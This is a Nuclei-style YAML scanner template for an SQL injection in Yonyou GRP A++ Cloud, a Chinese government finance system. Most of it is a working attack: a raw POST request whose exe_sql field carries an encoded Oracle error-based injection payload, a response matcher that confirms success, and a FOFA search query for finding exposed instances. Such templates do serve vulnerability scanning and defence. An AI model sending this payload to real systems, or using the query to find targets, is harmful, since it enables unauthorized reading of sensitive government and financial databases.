id: yonyou-grp-a-cloud-selectGlaDatasourcePreview-sqli

info:
  name: 用友 GRP A Cloud 政府财务云系统 selectGlaDatasourcePreview - sqli
  author: leadlife
  severity: high
  description: 用友 GRP A++ Cloud 政府财务云exe_sql存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。用友政务软件有限公司由用友（集团）和中国财政科学研究院共同设立，是面向政府部门、事业单位、非营利组织的全方位业务管理信息化解决方案提供商，是中国电子政务百强企业、中国领先的公共财政管理软件提供商、中国领先的行政事业单位计划财务管理软件提供商。公司的业务涵盖财政、银行、税务、社保、民生、公安、交通、海关、国土资源等行业。
  reference:
    - todo
  metadata:
    verified: false
    fofa-query: app="用友-政务财务系统" || body="/pf/portal/login/css/fonts/style.css"
  tags: yonyou,sqli,oa,grpacloud

http:
  - raw:
      - |
        POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        
        exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - qzkjq1q
